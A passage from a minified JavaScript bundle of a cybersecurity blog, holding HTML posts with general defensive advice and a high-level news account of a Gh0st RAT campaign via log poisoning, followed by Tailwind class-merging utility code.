    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#312e81); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#fbbf24;">🛠 Patch Smarter (Not Later)</h3><br>
      <p>
        Patching remains the single most effective defense against known vulnerabilities — yet many organizations still lag behind. This week, we saw critical zero-days 
        in widely used enterprise platforms being actively exploited within hours of disclosure. These incidents underline a key truth: <b>delayed patching equals unnecessary risk.</b>
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚡ <b>Prioritize internet-facing apps</b> and services where exposure risk is highest.</li>
        <li>🛠 Use <b>staged deployment</b> and <b>maintenance windows</b> to minimize operational disruption.</li>
        <li>📊 Leverage <b>threat intelligence</b> to track active exploitation and adjust patching urgency dynamically.</li>
      </ul>
      <p>
        In short, patching should not be a routine chore — it’s a strategic security function. The faster you close the window of exposure, the fewer opportunities attackers have.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2538,#0f3449); border-radius:12px; color:#dbeafe; margin-top:15px;">
      <h3 style="color:#34d399;">👀 Spot Early Risks Before They Escalate</h3><br>
      <p>
        Attackers rarely start with obvious moves. Instead, they leave subtle traces — anomalies that, if detected early, can prevent a full-scale breach. 
        Early detection isn’t just about monitoring; it’s about understanding behavior, context, and intent.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔍 Hunt for <b>anomalous authentication events</b>, unusual log spikes, and unexplained outbound traffic.</li>
        <li>🧩 Monitor <b>browser activity</b> — extensions, token misuse, and session hijacks are becoming common attack vectors.</li>
        <li>📈 Establish <b>baseline activity</b> for SaaS and cloud apps, then trigger alerts for deviations like token reuse or impossible travel events.</li>
      </ul>
      <p>
        The earlier you detect and respond, the less damage attackers can do — turning a potential breach into a contained incident.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f3f4f6; margin-top:15px;">
      <h3 style="color:#ef4444;">🧠 Prepare for What’s Next</h3><br>
      <p>
        Threat actors evolve, and so must your defenses. Beyond reacting to incidents, organizations should build resilience and readiness into their core strategy. 
        Proactive preparation ensures that when — not if — an attack occurs, the impact is minimized, and recovery is swift.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📚 Conduct regular <b>tabletop exercises</b> focused on real-world attack scenarios like ransomware or supply-chain compromise.</li>
        <li>🧠 Invest in <b>endpoint detection & response (EDR)</b> and <b>DNS egress filtering</b> to stop attackers mid-operation.</li>
        <li>🔐 Strengthen identity controls — deploy <b>passkeys</b>, <b>phishing-resistant MFA</b>, and <b>adaptive access policies</b>.</li>
      </ul>
      <p>
        Remember: cybersecurity is a lifecycle, not a checklist. Preparation today is the difference between disruption and disaster tomorrow.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8fafc; border-radius:12px; color:#0f172a; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Stay Sharp. Patch Fast. Defend Better.</h3><br>
      <p>
        This week’s biggest takeaway? <b>Speed and visibility save businesses</b>.  
        The sooner you patch, the faster you detect, and the better you prepare — the harder you make it for adversaries to succeed.
      </p>
     
    </section>
  `},{id:"gh0strat-open-source-attack-2025",title:"100th Blog Special: The Ghost in the Code — When Trusted Tools Turn Rogue",summary:"Marking our 100th post, this special edition uncovers how China-linked hackers weaponized trust itself — twisting an open-source tool into a silent infiltrator that deployed Gh0st RAT across 100+ servers.",date:"2025-10-09",author:"EthicalByte",tags:["Gh0st RAT","China-Linked APT","Supply Chain","Open Source","Cyber Espionage"],imageKey:"gh0stRat100thBlogBanner",content:`
    <section style="padding:35px; font-family:'Poppins',sans-serif; background:radial-gradient(circle at top left,#000000,#1a0000); border-radius:16px; color:#f8f9fa; border:2px solid #ff1b1b; box-shadow:0 0 25px rgba(255,27,27,0.3);">
      <h2 style="color:#ff3b3b; text-align:center; font-size:30px; text-shadow:0 0 12px #ff1b1b;">
        💯 100th Blog Celebration | The Ghost in the Code 👻
      </h2>
      <p style="text-align:center; font-size:16px; color:#e0e0e0;">
        “Even heroes can be deceived — when trust turns into a weapon, the battlefield shifts to the code itself.”
      </p><br>
      <p>
        It’s poetic, almost cinematic — the very code designed to secure our digital future  
        was turned against us. <b>China-linked threat actors</b> have taken a 
        <b>legitimate open-source tool</b> and turned it into a weapon of stealth, control, and espionage.  
        This wasn’t brute force; it was elegance cloaked in deception.
      </p>
      <p>
        The attackers used a <b>log poisoning technique</b> to implant a <b>web shell</b> across servers.  
        Without triggering alarms, they deployed <b>Gh0st RAT</b> — a Remote Access Trojan capable of  
        full system compromise, surveillance, and persistent control.  
        Over <b>100 servers</b> in multiple industries were compromised —  
        all without a single zero-day exploit.
      </p>
      <p>
        But the twist? The <b>control panel interface was written in Russian</b>.  
        Whether it’s a false flag or cross-group collaboration, attribution just got complicated.
      </p>
    </section>

    <section style="padding:30px; background:linear-gradient(135deg,#220000,#111111); border-radius:16px; color:#f5f5f5; margin-top:25px; box-shadow:0 0 20px rgba(255,0,0,0.4);">
      <h3 style="color:#ffb703;">🧠 The Anatomy of the Attack</h3><br>
      <p>
        The adversaries didn’t need new malware; they needed trust.  
        Here’s how they turned open-source transparency into a tactical advantage:
      </p>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>⚙️ <b>Exploited open-source utility</b> through log poisoning to inject malicious payloads.</li>
        <li>🧩 Deployed <b>Gh0st RAT</b> for deep surveillance and persistent access.</li>
        <li>👾 <b>Camouflaged communications</b> via AES-encrypted C2 traffic to avoid detection.</li>
        <li>🕵️‍♂️ Command-and-control panel <b>written in Russian</b> — a possible false-flag tactic.</li>
      </ul>
      <p>
        This operation underscores a chilling new era of cyber warfare:  
        <b>weaponized legitimacy</b>. The tools defenders trust most are now entry points for attackers.
      </p>
    </section>

    <section style="padding:30px; background:radial-gradient(circle at bottom right,#1a0000,#0a0a0a); border-radius:16px; color:#e2e8f0; margin-top:25px; box-shadow:inset 0 0 20px rgba(255,50,50,0.3);">
      <h3 style="color:#06d6a0;">💥 Why This Attack Changes Everything</h3><br>
      <p>
        This wasn’t about exploiting a system — it was about exploiting <b>trust itself</b>.  
        Open-source ecosystems thrive on collaboration, but also depend on  
        the integrity of every contributor. Compromise that chain, and you compromise the world.
      </p>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>🧩 <b>Supply chain trust</b> has become the weakest link.</li>
        <li>🚨 <b>Attackers are agile</b> — exploiting community-driven innovation faster than it can be secured.</li>
        <li>🔄 <b>Behavioral analytics</b> must evolve — focusing on subtle activity, not static signatures.</li>
        <li>🧠 <b>Developers need visibility</b> — code provenance and dependency validation are now critical.</li>
      </ul>
      <p>
        In essence, this attack isn’t a bug — it’s a betrayal.
      </p>
    </section>

    <section style="padding:35px; background:linear-gradient(135deg,#ff1b1b,#2b0000); border-radius:16px; color:#ffffff; margin-top:25px; text-align:center; box-shadow:0 0 25px rgba(255,0,0,0.6);">
      <h3 style="font-size:22px; color:#fff;">⚔️ The Lesson Behind the Code</h3><br>
      <p>
        Every milestone is a reflection of resilience.  
        EthicalByte began with one goal — to make cybersecurity **clear, visual, and human**.  
        Now, at our 100th post, we face a world where trust is the new perimeter.  
      </p>
      <p>
        <b>Every library. Every repo. Every dependency.</b>  
        They all carry the weight of the next possible compromise.  
        Security isn’t just about defense — it’s about awareness and adaptation.
      </p>
    </section>

    <section style="padding:40px; text-align:center; background:#ffffff; border-radius:16px; color:#000; margin-top:25px; border:2px solid #ff1b1b;">
      <h3 style="color:#ff1b1b;">🎉 100th Blog | The EthicalByte Legacy</h3><br>
      <p>
        💬 100 stories later, our message remains the same — <b>the future belongs to those who defend it</b>.  
        From darknets to data leaks, from malware to machine learning, we’ve chronicled  
        the pulse of cybersecurity with one guiding belief: **awareness saves**.
      </p>
      <p>
        To our readers, collaborators, and fellow defenders — this milestone isn’t ours alone.  
        It’s a salute to every mind that reads, questions, and acts.  
      </p>
      <p style="font-weight:bold; color:#ff1b1b; margin-top:15px;">
        Here’s to the next 100. Stronger. Sharper. Smarter. 🛡️
      </p>
    </section>
  `}],V2=n=>nd.find(e=>e.id===n);function Oy(n){var e,r,s="";if(typeof n=="string"||typeof n=="number")s+=n;else if(typeof n=="object")if(Array.isArray(n)){var a=n.length;for(e=0;e<a;e++)n[e]&&(r=Oy(n[e]))&&(s&&(s+=" "),s+=r)}else for(r in n)n[r]&&(s&&(s+=" "),s+=r);return s}function rd(){for(var n,e,r=0,s="",a=arguments.length;r<a;r++)(n=arguments[r])&&(e=Oy(n))&&(s&&(s+=" "),s+=e);return s}function W2(){for(var n=0,e,r,s="";n<arguments.length;)(e=arguments[n++])&&(r=jy(e))&&(s&&(s+=" "),s+=r);return s}function jy(n){if(typeof n=="string")return n;for(var e,r="",s=0;s<n.length;s++)n[s]&&(e=jy(n[s]))&&(r&&(r+=" "),r+=e);return r}var id="-";function $2(n){var e=q2(n),r=n.conflictingClassGroups,s=n.conflictingClassGroupModifiers,a=s===void 0?{}:s;function l(d){var p=d.split(id);return p[0]===""&&p.length!==1&&p.shift(),My(p,e)||H2(d)}function c(d,p){var f=r[d]||[];return p&&a[d]?[].concat(f,a[d]):f}return{getClassGroupId:l,getConflictingClassGroupIds:c}}function My(n,e){if(n.length===0)return e.classGroupId;var r=n[0],s=e.nextPart.get(r),a=s?My(n.slice(1),s):void 0;if(a)return a;if(e.validators.length!==0){var l=n.join(id);return e.validators.find(function(c){var d=c.validator;return d(l)})?.classGroupId}}var kg=/^\[(.+)\]$/;function H2(n){if(kg.test(n)){var e=kg.exec(n)[1],r=e?.substring(0,e.indexOf(":"));if(r)return"arbitrary.."+r}}function q2(n){var e=n.theme,r=n.prefix,s={nextPart:new Map,validators:[]},a=K2(Object.entries(n.classGroups),r);return a.forEach(function(l){var c=l[0],d=l[1];mu(d,s,c,e)}),s}function mu(n,e,r,s){n.forEach(function(a){if(typeof a=="string"){var l=a===""?e:xg(e,a);l.classGroupId=r;return}if(typeof a=="function"){if(G2(a)){mu(a(s),e,r,s);return}e.validators.push({validator:a,classGroupId:r});return}Object.entries(a).forEach(function(c){var d=c[0],p=c[1];mu(p,xg(e,d),r,s)})})}function xg(n,e){var r=n;return e.split(id).forEach(function(s){r.nextPart.has(s)||r.nextPart.set(s,{nextPart:new Map,validators:[]}),r=r.nextPart.get(s)}),r}function G2(n){return n.isThemeGetter}function K2(n,e){return e?n.map(function(r){var s=r[0],a=r[1],l=a.map(function(c){return typeof c=="string"?e+c:typeof c=="object"?Object.fromEntries(Object.entries(c).map(function(d){var p=d[0],f=d[1];return[e+p,f]})):c});return[s,l]}):n}function J2(n){if(n<1)return{get:function(){},set:function(){}};var e=0,r=new Map,s=new Map;function a(l,c){r.set(l,c),e++,e>n&&(e=0,s=r,r=new Map)}return{get:function(c){var d=r.get(c);if(d!==void 0)return d;if((d=s.get(c))!==void 0)return a(c,d),d},set:function(c,d){r.has(c)?r.set(c,d):a(c,d)}}}var By="!";function Q2(n){var e=n.separator||":",r=e.length===1,s=e[0],a=e.length;return function(c){for(var d=[],p=0,f=0,m,y=0;y<c.length;y++){var v=c[y];if(p===0){if(v===s&&(r||c.slice(y,y+a)===e)){d.push(c.slice(f,y)),f=y+a;continue}if(v==="/"){m=y;continue}}v==="["?p++:v==="]"&&p--}var w=d.length===0?c:c.substring(f),A=w.startsWith(By),k=A?w.substring(1):w,x=m&&m>f?m-f:void 0;return{modifiers:d,hasImportantModifier:A,baseClassName:k,maybePostfixModifierPosition:x}}}function Y2(n){if(n.length<=1)return n;var e=[],r=[];return n.forEach(function(s){var a=s[0]==="[";a?(e.push.apply(e,r.sort().concat([s])),r=[]):r.push(s)}),e.push.apply(e,r.sort()),e}function X2(n){return{cache:J2(n.cacheSize),splitModifiers:Q2(n),...$2(n)}}var Z2=/\s+/;function eS(n,e){var r=e.splitModifiers,s=e.getClassGroupId,a=e.getConflictingClassGroupIds,l=new Set;return n.trim().split(Z2).map(function(c){var d=r(c),p=d.modifiers,f=d.hasImportantModifier,m=d.baseClassName,y=d.maybePostfixModifierPosition,v=s(y?m.substring(0,y):m),w=!!y;if(!v){if(!y)return{isTailwindClass:!1,originalClassName:c};if(v=s(m),!v)return{isTailwindClass:!1,originalClassName:c};w=!1}var A=Y2(p).join(":"),k=f?A+By:A;return{isTailwindClass:!0,modifierId:k,classGroupId:v,originalClassName:c,hasPostfixModifier:w}}).reverse().filter(function(c){if(!c.isTailwindClass)return!0;var d=c.modifierId,p=c.classGroupId,f=c.hasPostfixModifier,m=d+p;return l.has(m)?!1:(l.add(m),a(p,f).forEach(function(y){return l.add(d+y)}),!0)}).reverse().map(function(c){return c.originalClassName}).join(" ")}function tS(){for(var n=arguments.length,e=new Array(n),r=0;r<n;r++)e[r]=arguments[r];var s,a,l,c=d;function d(f){var m=e[0],y=e.slice(1),v=y.reduce(function(w,A){return A(w)},m());return s=X2(v),a=s.cache.get,l=s.cache.set,c=p,p(f)}function p(f){var m=a(f);if(m)return m;var y=eS(f,s);return l(f,y),y}return function(){return c(W2.apply(null,arguments))}}function Oe(n){var e=function(s){return s[n]||[]};return e.isThemeGetter=!0,e}var Ny=/^\[(?:([a-z-]+):)?(.+)\]$/i,nS=/^\d+\/\d+$/,rS=new Set(["px","full","screen"]),iS=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,sS=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,oS=/^-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/;function Ht(n){return br(n)||rS.has(n)||nS.test(n)||yu(n)}function yu(n){return Ar(n,"length",hS)}function aS(n){return Ar(n,"size",Ly)}function lS(n){return Ar(n,"position",Ly)}function cS(n){return Ar(n,"url",pS)}function Ko(n){return Ar(n,"number",br)}function br(n){return!Number.isNaN(Number(n))}function uS(n){return n.endsWith("%")&&br(n.slice(0,-1))}function ls(n){return Sg(n)||Ar(n,"number",Sg)}function be(n){return Ny.test(n)}function cs(){return!0}function Nn(n){return iS.test(n)}function dS(n){return Ar(n,"",fS)}function Ar(n,e,r){var s=Ny.exec(n);return s?s[1]?s[1]===e:r(s[2]):!1}function hS(n){return sS.test(n)}function Ly(){return!1}function pS(n){return n.startsWith("url(")}function Sg(n){return Number.isInteger(Number(n))}function fS(n){return oS.test(n)}function gS(){var n=Oe("colors"),e=Oe("spacing"),r=Oe("blur"),s=Oe("brightness"),a=Oe("borderColor"),l=Oe("borderRadius"),c=Oe("borderSpacing"),d=Oe("borderWidth"),p=Oe("contrast"),f=Oe("grayscale"),m=Oe("hueRotate"),y=Oe("invert"),v=Oe("gap"),w=Oe("gradientColorStops"),A=Oe("gradientColorStopPositions"),k=Oe("inset"),x=Oe("margin"),B=Oe("opacity"),_=Oe("padding"),P=Oe("saturate"),M=Oe("scale"),V=Oe("sepia"),U=Oe("skew"),W=Oe("space"),G=Oe("translate"),ee=function(){return["auto","contain","none"]},ye=function(){return["auto","hidden","clip","visible","scroll"]},Ae=function(){return["auto",be,e]},q=function(){return[be,e]},le=function(){return["",Ht]},K=function(){return["auto",br,be]},fe=function(){return["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"]},ae=function(){return["solid","dashed","dotted","double","none"]},pe=function(){return["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity","plus-lighter"]},H=function(){return["start","end","center","between","around","evenly","stretch"]},Y=function(){return["","0",be]},J=function(){return["auto","avoid","all","avoid-page","page","left","right","column"]},I=function(){return[br,Ko]},N=function(){return[br,be]};return{cacheSize:500,theme:{colors:[cs],spacing:[Ht],blur:["none","",Nn,be],brightness:I(),borderColor:[n],borderRadius:["none","","full",Nn,be],borderSpacing:q(),borderWidth:le(),contrast:I(),grayscale:Y(),hueRotate:N(),invert:Y(),gap:q(),gradientColorStops:[n],gradientColorStopPositions:[uS,yu],inset:Ae(),margin:Ae(),opacity:I(),padding:q(),saturate:I(),scale:I(),sepia:Y(),skew:N(),space:q(),translate:q()},classGroups:{aspect:[{aspect:["auto","square","video",be]}],container:["container"],columns:[{columns:[Nn]}],"break-after":[{"break-after":J()}],"break-before":[{"break-before":J()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none"]}],clear:[{clear:["left","right","both","none"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[].concat(fe(),[be])}],overflow:[{overflow:ye()}],"overflow-x":[{"overflow-x":ye()}],"overflow-y":[{"overflow-y":ye()}],overscroll:[{overscroll:ee()}],"overscroll-x":[{"overscroll-x":ee()}],"overscroll-y":[{"overscroll-y":ee()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[k]}],"inset-x":[{"inset-x":[k]}],"inset-y":[{"inset-y":[k]}],start:[{start:[k]}],end:[{end:[k]}],top:[{top:[k]}],right:[{right:[k]}],bottom:[{bottom:[k]}],left:[{left:[k]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",ls]}],basis:[{basis:Ae()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",be]}],grow:[{grow:Y()}],shrink:[{shrink:Y()}],order:[{order:["first","last","none",ls]}],"grid-cols":[{"grid-cols":[cs]}],"col-start-end":[{col:["auto",{span:["full",ls]},be]}],"col-start":[{"col-start":K()}],"col-end":[{"col-end":K()}],"grid-rows":[{"grid-rows":[cs]}],"row-start-end":[{row:["auto",{span:[ls]},be]}],"row-start":[{"row-start":K()}],"row-end":[{"row-end":K()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",be]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",be]}],gap:[{gap:[v]}],"gap-x":[{"gap-x":[v]}],"gap-y":[{"gap-y":[v]}],"justify-content":[{justify:["normal"].concat(H())}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal"].concat(H(),["baseline"])}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[].concat(H(),["baseline"])}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[_]}],px:[{px:[_]}],py:[{py:[_]}],ps:[{ps:[_]}],pe:[{pe:[_]}],pt:[{pt:[_]}],pr:[{pr:[_]}],pb:[{pb:[_]}],pl:[{pl:[_]}],m:[{m:[x]}],mx:[{mx:[x]}],my:[{my:[x]}],ms:[{ms:[x]}],me:[{me:[x]}],mt:[{mt:[x]}],mr:[{mr:[x]}],mb:[{mb:[x]}],ml:[{ml:[x]}],"space-x":[{"space-x":[W]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[W]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit",be,e]}],"min-w":[{"min-w":["min","max","fit",be,Ht]}],"max-w":[{"max-w":["0","none","full","min","max","fit","prose",{screen:[Nn]},Nn,be]}],h:[{h:[be,e,"auto","min","max","fit"]}],"min-h":[{"min-h":["min","max","fit",be,Ht]}],"max-h":[{"max-h":[be,e,"min","max","fit"]}],"font-size":[{text:["base",Nn,yu]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",Ko]}],"font-family":[{font:[cs]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractons"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",be]}],"line-clamp":[{"line-clamp":["none",br,Ko]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",be,Ht]}],"list-image":[{"list-image":["none",be]}],"list-style-type":[{list:["none","disc","decimal",be]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[n]}],"placeholder-opacity":[{"placeholder-opacity":[B]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[n]}],"text-opacity":[{"text-opacity":[B]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[].concat(ae(),["wavy"])}],"text-decoration-thickness":[{decoration:["auto","from-font",Ht]}],"underline-offset":[{"underline-offset":["auto",be,Ht]}],"text-decoration-color":[{decoration:[n]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],indent:[{indent:q()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",be]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",be]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[B]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[].concat(fe(),[lS])}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",aS]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},cS]}],"bg-color":[{bg:[n]}],"gradient-from-pos":[{from:[A]}],"gradient-via-pos":[{via:[A]}],"gradient-to-pos":[{to:[A]}],"gradient-from":[{from:[w]}],"gradient-via":[{via:[w]}],"gradient-to":[{to:[w]}],rounded:[{rounded:[l]}],"rounded-s":[{"rounded-s":[l]}],"rounded-e":[{"rounded-e":[l]}],"rounded-t":[{"rounded-t":[l]}],"rounded-r":[{"rounded-r":[l]}],"rounded-b":[{"rounded-b":[l]}],"rounded-l":[{"rounded-l":[l]}],"rounded-ss":[{"rounded-ss":[l]}],"rounded-se":[{"rounded-se":[l]}],"rounded-ee":[{"rounded-ee":[l]}],"rounded-es":[{"rounded-es":[l]}],"rounded-tl":[{"rounded-tl":[l]}],"rounded-tr":[{"rounded-tr":[l]}],"rounded-br":[{"rounded-br":[l]}],"rounded-bl":[{"rounded-bl":[l]}],"border-w":[{border:[d]}],"border-w-x":[{"border-x":[d]}],"border-w-y":[{"border-y":[d]}],"border-w-s":[{"border-s":[d]}],"border-w-e":[{"border-e":[d]}],"border-w-t":[{"border-t":[d]}],"border-w-r":[{"border-r":[d]}],"border-w-b":[{"border-b":[d]}],"border-w-l":[{"border-l":[d]}],"border-opacity":[{"border-opacity":[B]}],"border-style":[{border:[].concat(ae(),["hidden"])}],"divide-x":[{"divide-x":[d]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[d]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[B]}],"divide-style":[{divide:ae()}],"border-color":[{border:[a]}],"border-color-x":[{"border-x":[a]}],"border-color-y":[{"border-y":[a]}],"border-color-t":[{"border-t":[a]}],"border-color-r":[{"border-r":[a]}],"border-color-b":[{"border-b":[a]}],"border-color-l":[{"border-l":[a]}],"divide-color":[{divide:[a]}],"outline-style":[{outline:[""].concat(ae())}],"outline-offset":[{"outline-offset":[be,Ht]}],"outline-w":[{outline:[Ht]}],"outline-color":[{outline:[n]}],"ring-w":[{ring:le()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:[n]}],"ring-opacity":[{"ring-opacity":[B]}],"ring-offset-w":[{"ring-offset":[Ht]}],"ring-offset-color":[{"ring-offset":[n]}],shadow:[{shadow:["","inner","none",Nn,dS]}],"shadow-color":[{shadow:[cs]}],opacity:[{opacity:[B]}],"mix-blend":[{"mix-blend":pe()}],"bg-blend":[{"bg-blend":pe()}],filter:[{filter:["","none"]}],blur:[{blur:[r]}],brightness:[{brightness:[s]}],contrast:[{contrast:[p]}],"drop-shadow":[{"drop-shadow":["","none",Nn,be]}],grayscale:[{grayscale:[f]}],"hue-rotate":[{"hue-rotate":[m]}],invert:[{invert:[y]}],saturate:[{saturate:[P]}],sepia:[{sepia:[V]}],"backdrop-filter":[{"backdrop-filter":["","none"]}],"backdrop-blur":[{"backdrop-blur":[r]}],"backdrop-brightness":[{"backdrop-brightness":[s]}],"backdrop-contrast":[{"backdrop-contrast":[p]}],"backdrop-grayscale":[{"backdrop-grayscale":[f]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[m]}],"backdrop-invert":[{"backdrop-invert":[y]}],"backdrop-opacity":[{"backdrop-opacity":[B]}],"backdrop-saturate":[{"backdrop-saturate":[P]}],"backdrop-sepia":[{"backdrop-sepia":[V]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":[c]}],"border-spacing-x":[{"border-spacing-x":[c]}],"border-spacing-y":[{"border-spacing-y":[c]}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["none","all","","colors","opacity","shadow","transform",be]}],duration:[{duration:N()}],ease:[{ease:["linear","in","out","in-out",be]}],delay:[{delay:N()}],animate:[{animate:["none","spin","ping","pulse","bounce",be]}],transform:[{transform:["","gpu","none"]}],scale:[{scale:[M]}],"scale-x":[{"scale-x":[M]}],"scale-y":[{"scale-y":[M]}],rotate:[{rotate:[ls,be]}],"translate-x":[{"translate-x":[G]}],"translate-y":[{"translate-y":[G]}],"skew-x":[{"skew-x":[U]}],"skew-y":[{"skew-y":[U]}],"transform-origin":[{origin:["center","top","top-right","right","bottom-right","bottom","bottom-left","left","top-left",be]}],accent:[{accent:["auto",n]}],appearance:["appearance-none"],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",be]}],"caret-color":[{caret:[n]}],"pointer-events":[{"pointer-events":["none","auto"]}],resize:[{resize:["none","y","x",""]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":q()}],"scroll-mx":[{"scroll-mx":q()}],"scroll-my":[{"scroll-my":q()}],"scroll-ms":[{"scroll-ms":q()}],"scroll-me":[{"scroll-me":q()}],"scroll-mt":[{"scroll-mt":q()}],"scroll-mr":[{"scroll-mr":q()}],"scroll-mb":[{"scroll-mb":q()}],"scroll-ml":[{"scroll-ml":q()}],"scroll-p":[{"scroll-p":q()}],"scroll-px":[{"scroll-px":q()}],"scroll-py":[{"scroll-py":q()}],"scroll-ps":[{"scroll-ps":q()}],"scroll-pe":[{"scroll-pe":q()}],"scroll-pt":[{"scroll-pt":q()}],"scroll-pr":[{"scroll-pr":q()}],"scroll-pb":[{"scroll-pb":q()}],"scroll-pl":[{"scroll-pl":q()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","pinch-zoom","manipulation",{pan:["x","left","right","y","up","down"]}]}],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",be]}],fill:[{fill:[n,"none"]}],"stroke-w":[{stroke:[Ht,Ko]}],stroke:[{stroke:[n,"none"]}],sr:["sr-only","not-sr-only"]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me",